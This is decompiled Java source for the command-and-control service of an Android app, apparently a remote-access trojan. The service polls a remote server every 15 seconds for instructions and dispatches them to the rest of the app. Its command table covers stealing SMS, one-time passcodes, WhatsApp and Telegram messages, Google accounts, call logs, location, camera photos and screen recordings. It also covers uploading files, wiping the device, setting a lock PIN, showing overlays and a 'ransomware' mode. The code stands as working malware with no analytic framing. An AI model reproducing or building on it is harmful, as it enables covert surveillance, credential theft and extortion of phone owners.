package com.love.app;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import com.android.internal.telephony.GsmAlphabet;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class CommandService extends Service {
    private static final String TAG = "CommandService";
    private String deviceId;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isPolling = false;
    private Runnable pollRunnable;
    private SharedPreferences prefs;
    private RequestQueue requestQueue;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        SharedPreferences sharedPreferences = getSharedPreferences("love_config", 0);
        this.prefs = sharedPreferences;
        String string = sharedPreferences.getString("device_id", null);
        this.deviceId = string;
        if (string == null || string.isEmpty()) {
            this.deviceId = Settings.Secure.getString(getContentResolver(), "android_id");
        }
        String str = this.deviceId;
        if (str == null || str.isEmpty()) {
            this.deviceId = "unknown_" + System.currentTimeMillis();
        }
        this.requestQueue = Volley.newRequestQueue(this);
        ConfigFetcher.loadLocalConfigSync(this);
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (ForegroundService.isRunning()) {
            Log.d(TAG, "ForegroundService aktif, CommandService masuk mode standby");
            stopSelf();
            return 2;
        }
        startPolling();
        return 1;
    }

    private void startPolling() {
        if (this.isPolling) {
            return;
        }
        this.isPolling = true;
        Runnable runnable = new Runnable() { // from class: com.love.app.CommandService.1
            @Override // java.lang.Runnable
            public void run() {
                if (CommandService.this.isPolling) {
                    CommandService.this.pollCommand();
                    CommandService.this.handler.postDelayed(this, 15000L);
                }
            }
        };
        this.pollRunnable = runnable;
        this.handler.post(runnable);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void pollCommand() {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null || baseUrl.isEmpty()) {
            ConfigFetcher.loadConfig(this, new ConfigFetcher.ConfigListener() { // from class: com.love.app.CommandService.2
                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigLoaded(String str) {
                    CommandService.this.pollCommand();
                }

                @Override // com.love.app.ConfigFetcher.ConfigListener
                public void onConfigFailed() {
                    Log.w(CommandService.TAG, "pollCommand: baseUrl belum tersedia");
                }
            });
            return;
        }
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(0, baseUrl + "/commands/poll?device_id=" + this.deviceId + "&timeout=10", null, new Response.Listener() { // from class: com.love.app.CommandService$$ExternalSyntheticLambda0
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                this.f$0.m219lambda$pollCommand$0$comloveappCommandService((JSONObject) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.CommandService$$ExternalSyntheticLambda1
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                CommandService.lambda$pollCommand$1(volleyError);
            }
        });
        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        this.requestQueue.add(jsonObjectRequest);
    }

    /* JADX INFO: renamed from: lambda$pollCommand$0$com-love-app-CommandService, reason: not valid java name */
    /* synthetic */ void m219lambda$pollCommand$0$comloveappCommandService(JSONObject jSONObject) {
        try {
            String string = jSONObject.getString("cmd");
            String strOptString = jSONObject.optString("param", "");
            String strOptString2 = jSONObject.optString("cmdId", "");
            Intent intent = new Intent("com.love.app.EXECUTE_CMD");
            intent.putExtra("cmd", parseCommandString(string));
            intent.putExtra("param", strOptString);
            intent.putExtra("cmdId", strOptString2);
            sendBroadcast(intent);
        } catch (Exception e) {
            Log.e(TAG, "Parse error", e);
        }
    }

    static /* synthetic */ void lambda$pollCommand$1(VolleyError volleyError) {
        if (volleyError.networkResponse == null || volleyError.networkResponse.statusCode != 204) {
            Log.w(TAG, "Poll error: " + volleyError.getMessage());
        }
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    private int parseCommandString(String str) {
        byte b;
        try {
            return Integer.parseInt(str);
        } catch (NumberFormatException unused) {
            str.hashCode();
            switch (str.hashCode()) {
                case -1772451948:
                    b = !str.equals("get_browser_history") ? (byte) -1 : (byte) 0;
                    break;
                case -1547878349:
                    b = !str.equals("change_wallpaper") ? (byte) -1 : (byte) 1;
                    break;
                case -1361568365:
                    b = !str.equals("enable_admin") ? (byte) -1 : (byte) 2;
                    break;
                case -1166066892:
                    b = !str.equals("screen_message") ? (byte) -1 : (byte) 3;
                    break;
                case -1153238695:
                    b = !str.equals("torch_blink") ? (byte) -1 : (byte) 4;
                    break;
                case -905425662:
                    b = !str.equals("torch_on") ? (byte) -1 : (byte) 5;
                    break;
                case -801679400:
                    b = !str.equals("get_file_list") ? (byte) -1 : (byte) 6;
                    break;
                case -703061618:
                    b = !str.equals("get_device_info") ? (byte) -1 : (byte) 7;
                    break;
                case -672658457:
                    b = !str.equals("screen_record_start") ? (byte) -1 : (byte) 8;
                    break;
                case -625596190:
                    b = !str.equals("uninstall") ? (byte) -1 : (byte) 9;
                    break;
                case -531454649:
                    b = !str.equals("get_call_logs") ? (byte) -1 : (byte) 10;
                    break;
                case -529991613:
                    b = !str.equals("get_google_accounts") ? (byte) -1 : (byte) 11;
                    break;
                case -471045599:
                    b = !str.equals("get_telegram_messages") ? (byte) -1 : (byte) 12;
                    break;
                case -416447130:
                    b = !str.equals(ScreenCaptureService.ACTION_SCREENSHOT) ? (byte) -1 : (byte) 13;
                    break;
                case -381820416:
                    b = !str.equals("lock_screen") ? (byte) -1 : (byte) 14;
                    break;
                case -202862044:
                    b = !str.equals("take_photo_front") ? (byte) -1 : (byte) 15;
                    break;
                case -119802007:
                    b = !str.equals("get_gallery") ? (byte) -1 : (byte) 16;
                    break;
                case -74788158:
                    b = !str.equals("get_otp") ? (byte) -1 : (byte) 17;
                    break;
                case -74784528:
                    b = !str.equals("get_sms") ? (byte) -1 : (byte) 18;
                    break;
                case -22011266:
                    b = !str.equals("get_location") ? (byte) -1 : (byte) 19;
                    break;
                case 3015911:
                    b = !str.equals("back") ? (byte) -1 : (byte) 20;
                    break;
                case 3208415:
                    b = !str.equals("home") ? (byte) -1 : (byte) 21;
                    break;
                case 3649607:
                    b = !str.equals("wipe") ? (byte) -1 : (byte) 22;
                    break;
                case 285574097:
                    b = !str.equals("overlay_hide") ? (byte) -1 : (byte) 23;
                    break;
                case 285901196:
                    b = !str.equals("overlay_show") ? (byte) -1 : (byte) 24;
                    break;
                case 354039290:
                    b = !str.equals("voice_message") ? (byte) -1 : (byte) 25;
                    break;
                case 358798490:
                    b = !str.equals("set_lock_mode") ? (byte) -1 : (byte) 26;
                    break;
                case 423583661:
                    b = !str.equals("get_whatsapp_number") ? (byte) -1 : GsmAlphabet.GSM_EXTENDED_ESCAPE;
                    break;
                case 451310959:
                    b = !str.equals("vibrate") ? (byte) -1 : (byte) 28;
                    break;
                case 466353328:
                    b = !str.equals("get_whatsapp_messages") ? (byte) -1 : (byte) 29;
                    break;
                case 544331407:
                    b = !str.equals("ransomware") ? (byte) -1 : (byte) 30;
                    break;
                case 546749333:
                    b = !str.equals("launch_app") ? (byte) -1 : (byte) 31;
                    break;
                case 671038429:
                    b = !str.equals("screen_record_stop") ? (byte) -1 : (byte) 32;
                    break;
                case 686056844:
                    b = !str.equals("take_photo_back") ? (byte) -1 : (byte) 33;
                    break;
                case 830295483:
                    b = !str.equals("send_voice") ? (byte) -1 : (byte) 34;
                    break;
                case 1011444682:
                    b = !str.equals("get_telegram") ? (byte) -1 : (byte) 35;
                    break;
                case 1064581370:
                    b = !str.equals("upload_file") ? (byte) -1 : (byte) 36;
                    break;
                case 1082295672:
                    b = !str.equals("recents") ? (byte) -1 : (byte) 37;
                    break;
                case 1198876607:
                    b = !str.equals("get_notifications") ? (byte) -1 : (byte) 38;
                    break;
                case 1247787042:
                    b = !str.equals("send_sms") ? (byte) -1 : (byte) 39;
                    break;
                case 1272354024:
                    b = !str.equals("notifications") ? (byte) -1 : (byte) 40;
                    break;
                case 1535597502:
                    b = !str.equals("set_lock_pin") ? (byte) -1 : (byte) 41;
                    break;
                case 1804460828:
                    b = !str.equals("get_contacts") ? (byte) -1 : (byte) 42;
                    break;
                case 1976113595:
                    b = !str.equals("get_apps") ? (byte) -1 : (byte) 43;
                    break;
                case 1996575404:
                    b = !str.equals("torch_off") ? (byte) -1 : (byte) 44;
                    break;
                default:
                    b = -1;
                    break;
            }
            switch (b) {
                case 0:
                    return 1007;
                case 1:
                    return 1011;
                case 2:
                    return Constant.CMD_ENABLE_ADMIN;
                case 3:
                    return 1013;
                case 4:
                    return 1018;
                case 5:
                    return 1016;
                case 6:
                    return 1014;
                case 7:
                    return 1006;
                case 8:
                    return Constant.CMD_SCREEN_RECORD_START;
                case 9:
                    return Constant.CMD_UNINSTALL;
                case 10:
                    return 1004;
                case 11:
                    return Constant.CMD_GET_GOOGLE_ACCOUNTS;
                case 12:
                    return Constant.CMD_GET_TELEGRAM_MESSAGES;
                case 13:
                    return Constant.CMD_SCREENSHOT;
                case 14:
                    return Constant.CMD_LOCK_SCREEN;
                case 15:
                    return Constant.CMD_TAKE_PHOTO_FRONT;
                case 16:
                    return 1020;
                case 17:
                    return Constant.CMD_GET_OTP;
                case 18:
                    return 1002;
                case 19:
                    return Constant.CMD_GET_LOCATION;
                case 20:
                    return Constant.CMD_BACK;
                case 21:
                    return Constant.CMD_HOME;
                case 22:
                    return 1009;
                case 23:
                    return Constant.CMD_OVERLAY_HIDE;
                case 24:
                    return Constant.CMD_OVERLAY_SHOW;
                case 25:
                    return 1012;
                case 26:
                    return Constant.CMD_SET_LOCK_MODE;
                case 27:
                    return Constant.CMD_GET_WHATSAPP_NUMBER;
                case 28:
                    return 1008;
                case 29:
                    return Constant.CMD_GET_WHATSAPP_MESSAGES;
                case 30:
                    return 1010;
                case 31:
                    return Constant.CMD_LAUNCH_APP;
                case 32:
                    return Constant.CMD_SCREEN_RECORD_STOP;
                case 33:
                    return Constant.CMD_TAKE_PHOTO_BACK;
                case 34:
                    return Constant.CMD_SEND_VOICE;
                case 35:
                    return Constant.CMD_GET_TELEGRAM;
                case 36:
                    return 1015;
                case 37:
                    return Constant.CMD_RECENTS;
                case 38:
                    return 1019;
                case 39:
                    return 1003;
                case 40:
                    return Constant.CMD_NOTIFICATIONS;
                case 41:
                    return Constant.CMD_SET_LOCK_PIN;
                case 42:
                    return 1001;
                case 43:
                    return Constant.CMD_GET_APPS;
                case 44:
                    return 1017;
                default:
                    return -1;
            }
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.isPolling = false;
        Runnable runnable = this.pollRunnable;
        if (runnable != null) {
            this.handler.removeCallbacks(runnable);
        }
    }
}
